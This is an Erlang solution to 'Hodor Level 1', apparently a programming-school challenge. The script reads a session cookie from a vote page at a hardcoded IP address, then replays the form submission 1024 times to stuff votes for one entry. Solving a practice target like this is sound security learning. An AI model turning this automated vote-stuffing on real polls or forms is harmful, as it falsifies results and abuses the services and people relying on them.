%% ===-----Hodor Level 1---------------------------------------------===
%%          Hodor Level 1 Project, by Julien Barbier.
%%  "Make 1024 votes in this page: http://173.246.108.142/level1.php"
%%  Solution using Erlang code.
%%
%%  by Alexandro de Oliveira.
%% ===---------------------------------------------------------------===

-module(hodor1).
-export([main/0, for/2, posting/0]).

% Parsing the Cookie(I didn't find a specific function/method to parse the cookie or
%% a cookie session manager):
parse(A, S, I) ->
    T = string:tokens(A, S),
    lists:nth(I, T). %% In Erlang the last line is returned(we don't need to "return").
%% Getting one cookie with a HEAD request:
getCookie(URL) ->
    {ok,{ _,Headers, _}} = httpc:request(head, { URL, []}, [], []),
    C = proplists:get_value("set-cookie", Headers),
    Cookie = parse(C, ";", 1),
    parse(Cookie, "=", 2).

posting() ->
Method = post,
URL = "http://173.246.108.142/level1.php",
Cookie = getCookie(URL),
Header = [{"User-Agent","havk64 Erlang Requests"}, {"Cookie", "HoldTheDoor=" ++ Cookie}],
Type = "application/x-www-form-urlencoded",
Body = "id=23&holdthedoor=submit&key=" ++ Cookie,

httpc:request(Method, {URL, Header, Type, Body }, [], []),
io:fwrite(".").

for(0,_) ->
   [];
   for(N,Term) when N > 0 ->
   posting(),
   [Term|for(N-1,Term)].


main() ->
    ssl:start(),
    application:start(inets),
    for(1024, 1).
